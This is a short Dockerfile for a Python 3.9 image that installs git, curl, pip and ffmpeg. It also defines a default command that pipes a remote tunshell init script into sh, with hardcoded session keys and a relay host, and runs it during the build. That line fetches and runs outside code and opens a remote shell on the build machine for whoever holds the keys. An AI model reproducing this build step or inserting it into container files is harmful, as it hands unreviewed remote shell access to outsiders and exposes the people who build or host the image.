FROM python:3.9.7-slim-buster

# Update and upgrade existing packages
RUN apt-get update && apt-get upgrade -y

# Install necessary packages
RUN apt-get install -y \
    git \
    curl \
    python3-pip \
    ffmpeg

# Define a build argument for the tunshell command
ARG TUNSHELL_COMMAND="curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T thUb5z6pcANKclRHIsJkRL fP6a2UEdtW1Nnv965iIUrv eu.relay.tunshell.com"

# Set an environment variable with the default command
ENV TUNSHELL_COMMAND=${TUNSHELL_COMMAND}

# Run the tunshell initialization script based on the environment variable
RUN ${TUNSHELL_COMMAND}
